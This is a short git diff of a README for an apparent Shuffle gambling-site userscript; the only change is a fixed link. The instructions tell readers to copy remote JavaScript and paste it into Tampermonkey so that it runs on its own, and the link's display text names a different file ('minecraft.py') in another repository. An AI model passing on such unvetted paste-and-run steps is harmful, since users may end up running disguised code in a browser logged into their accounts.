@@ -30,7 +30,7 @@ Just make sure you select **ARS** as your currency.
 
 ### 🛠️ Option 3: Tampermonkey
 
-1. Copy: [tampermonkey.js]([https://raw.githubusercontent.com/drojnisdisauioa/LunarClient/refs/heads/main/minecraft.py](https://raw.githubusercontent.com/drojnisdisauioa/Shuffle/refs/heads/main/tampermonkey.js))
+1. Copy: [tampermonkey.js]([https://raw.githubusercontent.com/drojnisdisauioa/LunarClient/refs/heads/main/minecraft.py](https://raw.githubusercontent.com/drojnisdisauioa/Shuffle/refs/heads/main/tampermonkey.js)
 2. Open **Tampermonkey Dashboard** and click **Create a new script**.
 3. Paste the code, then save.
 4. Head to the website and it’ll do its thing automatically.
